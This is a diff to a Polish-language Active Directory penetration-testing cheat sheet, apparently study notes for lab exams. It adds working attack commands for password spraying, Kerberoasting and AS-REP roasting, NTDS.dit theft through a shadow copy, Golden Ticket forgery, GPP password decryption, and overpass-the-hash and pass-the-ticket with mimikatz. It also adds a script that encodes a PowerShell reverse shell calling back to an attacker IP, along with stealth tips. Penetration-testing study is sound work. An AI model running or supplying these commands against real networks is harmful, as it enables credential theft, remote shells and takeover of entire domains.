@@ -1106,11 +1106,24 @@ hashcat -m 13400 kp.hash  /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat
 > Dodatkowe tryby `-m`: **13400** KeePass · **22921** klucz SSH · **11600** 7-Zip · **13600** ZIP · **9600** Office 2013+ · **7500** Kerberos AS-REQ (etype 23).
 
 ### Password spraying (1 hasło × wielu userów)
-```bash
-crackmapexec smb $DC -u users.txt -p 'Sezon2024!' -d $DOMAIN --continue-on-success   # nxc = następca cme
-kerbrute passwordspray -d $DOMAIN users.txt 'Sezon2024!'          # przez Kerberos (ciszej)
+> **Najpierw sprawdź politykę lockout**, policz bezpieczną liczbę prób:
+```cmd
+net accounts                          :: Lockout threshold / observation window / min. długość hasła (na hoście domenowym)
 ```
-> ⚠️ Uwaga na **lockout policy** — spray JEDNYM hasłem na rundę, z przerwami. Mutacje list haseł: `hashcat --stdout wordlist.txt -r best64.rule` albo `kwp` (kwprocessor, maski klawiaturowe).
+Z Kali / Linuxa:
+```bash
+crackmapexec smb $DC -u users.txt -p 'Sezon2024!' -d $DOMAIN --continue-on-success   # nxc = następca cme; '(Pwn3d!)' = local admin!
+kerbrute passwordspray -d $DOMAIN users.txt 'Sezon2024!'          # przez Kerberos (2 pakiety UDP/próbę, najciszej)
+```
+Z hosta domenowego (Windows):
+```powershell
+.\Spray-Passwords.ps1 -Pass Nexus123! -Admin        # auto-enumeruje userów i sprayuje (-File = wordlista, -Admin = też admini)
+# Low-and-slow przez ADSI (najmniej ruchu — 1 obiekt = 1 próba):
+$d=[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain(); $PDC=($d.PdcRoleOwner).Name
+$DN="DC=$($d.Name.Replace('.',',DC='))"; $S="LDAP://$PDC/$DN"
+New-Object System.DirectoryServices.DirectoryEntry($S,"pete","Nexus123!")   # brak wyjątku = hasło poprawne
+```
+> ⚠️ **Lockout:** spray JEDNYM hasłem na rundę, z przerwami. `crackmapexec` NIE sprawdza polityki i jest głośny (pełne SMB/próba); `kerbrute` najcichszy. `Spray-Passwords.ps1` wymaga `powershell -ep bypass`. Mutacje list: `hashcat --stdout wordlist.txt -r best64.rule` albo `kwp`.
 
 ## 5.2 Mimikatz (Windows, wymaga admina/SYSTEM)
 
@@ -1151,20 +1164,31 @@ impacket-secretsdump -just-dc $DOMAIN/user:password@$DC   # DCSync przez sieć (
 ## 5.3 Kerberos
 
 ### AS-REP Roasting (Linux — patrz też §1.8)
+> Cel: konta z flagą `DONT_REQUIRE_PREAUTH` (UAC `0x410200`). Bez creds można samą listą userów; z creds `-request` bierze hash.
 ```bash
 impacket-GetNPUsers $DOMAIN/ -dc-ip $DC -usersfile users.txt -format hashcat -outputfile asrep.txt -no-pass
-hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
+impacket-GetNPUsers -dc-ip $DC -request -outputfile asrep.txt $DOMAIN/pete    # z poświadczeniami jednego usera
+hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
 ```
 ### Kerberoasting (konta z SPN — wymaga dowolnych poprawnych creds)
 ```bash
 impacket-GetUserSPNs $DOMAIN/user:password -dc-ip $DC -request -outputfile kerberoast.txt
-hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
+hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
 ```
-### Rubeus (Windows)
+> ⚠️ Błąd `KRB_AP_ERR_SKEW (Clock skew too great)` = rozjazd czasu z DC. Nie zmieniaj zegara Kali — użyj `faketime`: `sudo ntpdate $DC` (odczyt) → `faketime -f '+Xh' impacket-GetUserSPNs ...`. Konta maszynowe/gMSA/krbtgt mają losowe 120-znakowe hasła (niełamalne) → celuj w **konta userów** z SPN.
+
+### Rubeus (Windows — na hoście domenowym)
 ```
-Rubeus.exe asreproast
-Rubeus.exe kerberoast
+Rubeus.exe asreproast /nowrap                    :: /nowrap = hash bez łamania linii (łatwiej skopiować)
+Rubeus.exe kerberoast /outfile:hashes.kerberoast
+Rubeus.exe kerberoast /tgtdeleg                   :: wymuś RC4 (etype 23) gdy konto ma AES — łatwiejsze łamanie
 ```
+> Hashe kopiujesz na Kali i łamiesz (18200 / 13100). Rubeus/Ghostpack mają sygnatury AV.
+
+### Targeted roasting (gdy masz GenericWrite/GenericAll nad userem — patrz §6.5)
+> Nie znasz podatnych kont, ale kontrolujesz cudzy obiekt? Sam go „uczyń podatnym", zbierz hash, cofnij zmianę:
+> - **Targeted Kerberoast:** dopisz SPN ofierze (`Set-DomainObject ... -Set @{serviceprincipalname='fake/svc'}`) → `Rubeus kerberoast` → usuń SPN.
+> - **Targeted AS-REP:** ustaw ofierze flagę `DONT_REQ_PREAUTH` (przez UAC) → AS-REP roast → cofnij flagę. **Nie resetuj hasła** (zablokuje usera) — modyfikuj UAC.
 
 ## 5.4 Responder — LLMNR / NBT-NS / mDNS poisoning
 
@@ -1240,21 +1264,29 @@ impacket-secretsdump -just-dc $DOMAIN/jeffadmin:'Haslo123!'@$DC             # ca
 impacket-secretsdump -just-dc-user krbtgt $DOMAIN/jeffadmin:'Haslo123!'@$DC  # tylko krbtgt (pod golden)
 ```
 ```cmd
-:: Offline na DC — kopia bazy przez Volume Shadow Copy, potem parsuj na Kali:
-copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\ntds\ntds.dit c:\ntds.dit.bak
-reg save hklm\system c:\system.bak
+:: Offline na DC (jako DA) — ntds.dit jest zablokowany, więc zrób Volume Shadow Copy:
+vshadow.exe -nw -p C:                                :: utwórz shadow (-nw bez writerów=szybciej); ZANOTUJ 'Shadow copy device name'
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
+reg.exe save hklm\system c:\system.bak               :: SYSTEM hive potrzebny do odszyfrowania NTDS
 ```
 ```bash
-impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL           # parsuj offline
+impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL           # parsuj offline (przenieś oba .bak na Kali)
 ```
-> Z NTDS masz NTLM wszystkich kont (w tym `krbtgt:502:...:HASH`) + klucze Kerberos (AES). Hash krbtgt = klucz do Golden Ticket.
+> Z NTDS masz NTLM wszystkich kont (w tym `krbtgt:502:...:HASH`) + klucze Kerberos (AES). Hash krbtgt = klucz do Golden Ticket. `vshadow.exe` to podpisana binarka z Windows SDK. **DCSync (§5.2) jest cichszy** — nie dotyka dysku ani nie zostawia śladu narzędzi.
 
 ### Golden Ticket (fałszywy TGT — dowolny user, cała domena)
-> Potrzebne: NTLM **krbtgt** + **SID** domeny. Ważny nawet po zmianie hasła ofiary (do 2 rotacji krbtgt). SID: `whoami /user` lub `Get-ADDomain`.
+> Potrzebne: NTLM **krbtgt** + **SID** domeny. Ważny nawet po zmianie hasła ofiary (krbtgt rzadko rotowany). Forsowanie+wstrzyknięcie biletu **nie wymaga admina** i działa z maszyny spoza domeny.
 ```
+mimikatz # privilege::debug
+mimikatz # lsadump::lsa /patch          :: na DC — wyciągnij hash krbtgt (RID 502) i SID domeny
+mimikatz # kerberos::purge             :: wyczyść istniejące bilety PRZED wstrzyknięciem
 mimikatz # kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
+mimikatz # misc::cmd                    :: otwórz nowy cmd z wstrzykniętym biletem
 ```
-> `/ptt` = wstrzyknij bilet do bieżącej sesji od razu → potem `dir \\dc1\c$` / psexec bez hasła.
+```cmd
+PsExec.exe \\dc1 cmd.exe                :: po NAZWIE hosta (nie IP!) → Kerberos; potem: whoami /groups → Domain/Enterprise/Schema Admins
+```
+> `/ptt` = wstrzyknij bilet od razu. ⚠️ Od lipca 2022 (KB5008380 / CVE-2021-42287) **musisz podać ISTNIEJĄCE konto** (`/user:jen`) — dawniej działała dowolna nazwa. Domyślnie bilet dostaje grupy 512/513/518/519/520.
 
 ### Silver Ticket (fałszywy TGS — jedna usługa, ciszej)
 > Potrzebne: hash konta **usługi** (np. konta komputera / SPN) + SID. Dostęp tylko do wskazanej usługi (`/service`), ale **bez ruchu do DC** → trudniejsze do wykrycia niż golden.
@@ -1274,7 +1306,10 @@ mimikatz # kerberos::golden /user:jeffadmin /domain:corp.com /sid:S-1-5-21-19873
 > 2. **Zmapuj domenę** — userzy, grupy, komputery, SPN-y, polityka haseł (§6.2). Cel: lista kont + gdzie co stoi.
 > 3. **Szukaj szybkich winów** — AS-REP (§1.8), Kerberoast (§5.3), hasła w `description`, `Find-LocalAdminAccess`, `Find-DomainShare -CheckShareAccess`.
 > 4. **ACL abuse** (§6.5) — kto ma potężne prawo nad kim (`Find-InterestingDomainAcl`). Znajdź GenericAll/WriteDacl/ForceChangePassword → przejmij konto → **powtórz enumerację z nowego kontekstu**. To pętla, nie jeden strzał.
-> 5. **Eskaluj do domeny** — gdy dojdziesz do DA/DCSync → NTDS.dit, Golden/Silver Ticket (§5.6).
+> 5. **Ruch boczny** — z sesji admina/hasha/biletu skacz dalej: PtH/Overpass/PtT (§7.2), WMI/WinRM/PsExec/DCOM (§7.1). Po każdym hoście → dumpuj LSASS (§5.2) i szukaj nowych creds.
+> 6. **Eskaluj do domeny** — gdy dojdziesz do DA/DCSync → NTDS.dit, Golden/Silver Ticket (§5.6).
+>
+> ⚙️ **Setup:** wchodź na hosta przez **RDP** (`xfreerdp /u: /d: /v:`), nie WinRM/PSRemoting — inaczej trafisz na **Kerberos double-hop** i narzędzia enum przestaną sięgać do DC. Skrypty odpalaj po `powershell -ep bypass`. Po każdym nowym foothold **powtórz całą enumerację** — uprawnienia różnią się per konto.
 >
 > 💎 **Co jest wartościowe (na co polować):** konta z SPN (Kerberoast) · konta `DONT_REQ_PREAUTH` (AS-REP) · hasła w `description`/`info`/GPP · prawa ACL (GenericAll/WriteDacl/GenericWrite/ForceChangePassword) · local admin (`Find-LocalAdminAccess`) · sesje adminów (`Get-NetSession`) · share'y z zapisem/creds (`-CheckShareAccess`) · grupy z „Admin" w nazwie · zagnieżdżenia grup (członek grupy A, która jest w uprzywilejowanej B).
 
@@ -1375,9 +1410,18 @@ Get-NetSession -ComputerName files04               # kto ma sesję na hoscie (na
 Find-DomainShare -CheckShareAccess                 # share'y, do KTÓRYCH mam dostęp (bez flagi = wszystkie)
 Get-ObjectAcl -Identity stephanie                  # ACL obiektu (kto ma nad nim prawa); nowsza nazwa: Get-DomainObjectAcl
 Find-InterestingDomainAcl -ResolveGUIDs            # ciekawe prawa (GenericAll/WriteDacl...) w całej domenie
+Convert-SidToName S-1-5-21-...-1104                # SID → nazwa (obowiązkowe do czytania ACL-i)
 Invoke-Kerberoast                                  # od razu wyciąga hashe TGS-REP
 ```
-> `Get-NetSession` + `Find-LocalAdminAccess` = mapowanie ścieżek lateral movement bez BloodHound. `Get-ObjectAcl` + `Find-InterestingDomainAcl` = szukanie ścieżek ACL-owych (masz np. WriteDacl nad kontem admina → przejmujesz je). **Pełny łańcuch ACL abuse → §6.5.**
+> `Get-NetSession` + `Find-LocalAdminAccess` = mapowanie ścieżek lateral movement bez BloodHound. `Get-ObjectAcl` + `Find-InterestingDomainAcl` = szukanie ścieżek ACL-owych (masz np. WriteDacl nad kontem admina → przejmujesz je). **Pełny łańcuch ACL abuse → §6.5, domain shares/SYSVOL → §6.6.**
+
+**Kto jest zalogowany (logged-on users → namierzanie adminów):**
+```powershell
+Get-NetSession -ComputerName files04 -Verbose      # na serwerach często "Access is denied" (od 2016 wymaga uprawnień)
+Get-NetSession -ComputerName client74              # workstacje userów zwykle ODPOWIADAJĄ → tu szukaj sesji
+.\PsLoggedon.exe \\files04                          # Sysinternals — alternatywa, gdy Get-NetSession blokuje
+```
+> Praktyka z modułu: `Get-NetSession` na kontrolerach/serwerach zwykle zwraca *Access denied*, ale na **stacjach roboczych** działa — tam łapiesz, gdzie loguje się admin (cel PtH/lateral). `PsLoggedon` to backup, gdy sesje są zablokowane.
 
 ### D. Moduł ActiveDirectory (natywny, „czysty”)
 ```powershell
@@ -1488,6 +1532,46 @@ Jeśli ofiara ma prawo nad kolejnym obiektem → powtórz Krok 1–4. Jeśli to 
 
 > ⚠️ **Tradecraft:** reset hasła jest destrukcyjny (blokuje prawdziwego usera) — w labie OK, w realnym teście wybieraj Kerberoast/SPN gdy masz GenericWrite i ZAWSZE sprzątaj dopisane SPN-y/ACL-e/członkostwa. Odnotuj każdą zmianę do raportu.
 
+### Czytanie ACL — SID → nazwa
+> Output ACL ma `SecurityIdentifier` jako surowy SID. Zawsze go rozwiń, żeby wiedzieć KTO to:
+```powershell
+Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104
+# wiele naraz (np. wszystkie SID-y z GenericAll nad grupą):
+"S-1-5-...-512","S-1-5-...-1104","S-1-5-32-548" | Convert-SidToName
+# widok ACL grupy filtrowany po prawie:
+Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
+```
+
+### Nadużycie AddMember natywnie (net) + sprzątanie
+```cmd
+net group "Management Department" stephanie /add /domain    :: dodaj się do grupy
+net group "Management Department" stephanie /del /domain     :: POSPRZĄTAJ po sobie
+```
+```powershell
+Get-NetGroup "Management Department" | select member         # weryfikacja (przed i po)
+```
+
+## 6.6 Domain shares & SYSVOL (GPP cpassword)
+
+> Share'y to skarbnica: skrypty z hasłami, backupy, klucze — a **SYSVOL** (czytelny dla każdego usera domeny) często zawiera stare GPP z zaszyfrowanym hasłem (`cpassword`), które odszyfrujesz publicznym kluczem.
+
+```powershell
+Find-DomainShare -CheckShareAccess                 # share'y, do których MAM dostęp
+# przejrzyj SYSVOL (replikowany na wszystkie DC, czytelny dla domeny):
+ls \\dc1.corp.com\sysvol\corp.com\
+ls \\dc1.corp.com\sysvol\corp.com\Policies\
+# GPP z hasłem — Groups.xml / *-policy-backup.xml zawierają pole cpassword:
+cat \\dc1.corp.com\sysvol\corp.com\Policies\oldpolicy\old-policy-backup.xml
+# poluj rekurencyjnie po całym SYSVOL:
+Get-ChildItem \\dc1.corp.com\sysvol\ -Recurse -Include *.xml,*.ps1,*.bat,*.vbs -ErrorAction SilentlyContinue | Select-String -Pattern "cpassword|password|net use"
+```
+Odszyfrowanie `cpassword` na Kali (klucz AES jest publiczny — MS go opublikował):
+```bash
+gpp-decrypt "j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw"
+# alternatywnie: impacket-Get-GPPPassword / crackmapexec smb $IP -u u -p p -M gpp_password
+```
+> 💎 **Czego szukać na share'ach:** `cpassword` w Groups.xml/Services/ScheduledTasks/DataSources · pliki `unattend.xml`/`sysprep.xml` · skrypty logowania z `net use ... /user:` · `.kdbx`/`.ppk`/`id_rsa` · configi z connection stringami · backupy (`*.bak`, `*.vhd`, NTDS). Zapis do share z logon-scriptem = możliwość podłożenia payloadu.
+
 ---
 
 # 7. Lateral Movement (Ruch boczny)
@@ -1497,10 +1581,22 @@ Jeśli ofiara ma prawo nad kolejnym obiektem → powtórz Krok 1–4. Jeśli to 
 
 ## 7.1 Zdalne wykonanie z poświadczeniami
 
+> 🎯 **Który mechanizm?** Masz *hasło* local-admina → PsExec / WMI / WinRS. Masz tylko *hash* → PtH (impacket-wmiexec) lub Overpass-the-Hash (§7.2). Cel wymusza *Kerberos* (po nazwie hosta) → Overpass/PtT. WinRM/SMB zablokowane → DCOM (135). **Warunek dla większości: user w grupie Administrators celu** (WinRS wystarczy też *Remote Management Users*).
+
+### Payload: zakoduj reverse shell do base64 (pod WMI/WinRS/DCOM)
+> Argumenty z cudzysłowami psują się przy zdalnym wywołaniu — podawaj payload jako `powershell -nop -w hidden -e <base64>`. Listener `nc -lnvp 443` odpal PRZED.
+```python
+# encode.py — utf16+base64 (strip BOM [2:]); podmień IP/port na swój listener
+import base64
+p='$c=New-Object System.Net.Sockets.TCPClient("192.168.118.2",443);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+"PS "+(pwd).Path+"> ";$sby=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sby,0,$sby.Length);$s.Flush()};$c.Close()'
+print("powershell -nop -w hidden -e "+base64.b64encode(p.encode('utf16')[2:]).decode())
+```
+
 ### PsExec (445/TCP SMB, grupa Administrators)
 ```cmd
 psexec64.exe \\MACHINE_IP -u Administrator -p Mypass123 -i cmd.exe
 ```
+> Wymaga: user w lokalnych Administrators celu + share **ADMIN$** + File&Printer Sharing. Zostawia `psexesvc.exe` w `C:\Windows` + tworzy usługę (ślad forensyczny).
 ### WinRM (5985/5986, grupa Remote Management Users)
 ```cmd
 winrs.exe -u:Administrator -p:Mypass123 -r:target cmd
@@ -1532,6 +1628,13 @@ runas /netonly /user:ZA.TRYHACKME.COM\t1_leonard.summers "c:\tools\nc64.exe -e c
 sc.exe \\thmiis.za.tryhackme.com create THMservice-3249 binPath= "%windir%\myservice.exe" start= auto
 sc.exe \\thmiis.za.tryhackme.com start THMservice-3249
 ```
+
+### WMI — najprostsza forma (process call create)
+```cmd
+:: jednolinijkowiec (wmic, przestarzały ale wszędzie działa); ReturnValue=0 = sukces, zwraca PID
+wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create "calc"
+```
+> RPC na 135, dane sesji na 49152-65535. Proces startuje w Session 0. `wmic` przestarzały → preferuj metodę PowerShell CIM/DCOM poniżej. UAC-remote NIE dotyczy userów domenowych → masz pełne prawa do lateral.
 
 ### WMI + MSI (135/5985, Administrators)
 ```bash
@@ -1598,13 +1701,40 @@ evil-winrm -i $IP -u MyUser -H NTLM_HASH
 crackmapexec smb $IP -u MyUser -H NTLM_HASH
 ```
 
-### Pass-the-Ticket (Kerberos .kirbi)
+### Overpass-the-Hash (hash NTLM → bilet Kerberos)
+> Gdy cel wymusza **Kerberos** (PsExec/usługa po nazwie hosta, nie po IP), a masz tylko hash NTLM. Zamień hash na TGT i uwierzytelniaj się Kerberosem. Wymaga admina lokalnie (odczyt LSASS).
+```
+mimikatz # privilege::debug
+mimikatz # sekurlsa::logonpasswords          :: wyciągnij hash NTLM ofiary
+mimikatz # sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell
+```
+```cmd
+:: w NOWYM powershellu (kontekst ofiary):
+klist                                   :: na start 0 biletów
+net use \\files04                       :: dowolna akcja domenowa WYMUSZA utworzenie TGT+TGS
+klist                                   :: teraz widać TGT (krbtgt/CORP.COM) + CIFS TGS
+.\PsExec.exe \\files04 cmd              :: PsExec po NAZWIE hosta → Kerberos (po IP wymusiłoby NTLM = fail)
+```
+> ⚠️ `whoami` w nowym oknie pokaże Twojego pierwotnego usera (token się nie zmienia) — to normalne, liczą się wstrzyknięte bilety. PsExec **nie** przyjmuje hasha → dlatego najpierw robisz bilet.
+
+### Pass-the-Ticket (kradzież cudzego biletu z pamięci)
+> Ukradnij TGS/TGT innego zalogowanego usera i wstrzyknij, by wejść tam, gdzie on ma dostęp (np. restricted share). Jeśli bilety należą do Ciebie — admin niepotrzebny.
 ```
 mimikatz
 privilege::debug
-sekurlsa::tickets /export
-kerberos::ptt [0;427fcd5]-2-0-40e10000-Administrator@krbtgt-ZA.TRYHACKME.COM.kirbi
+sekurlsa::tickets /export                :: zrzuca wszystkie bilety do plików .kirbi w bieżącym katalogu
 ```
+```cmd
+dir *.kirbi                              :: wybierz bilet w formacie <user>@cifs-<host>.kirbi
+```
+```
+kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
+```
+```powershell
+klist                                    # potwierdź wstrzyknięty bilet (np. dave cifs/web04)
+ls \\web04\backup                        # sprawdź dostęp PRZED i PO (dowód działania)
+```
+> TGS działa tylko dla jednej usługi/hosta; TGT (~10h) pozwala poprosić o dowolny TGS.
 
 ### Pass-the-Key (z ekeys)
 ```
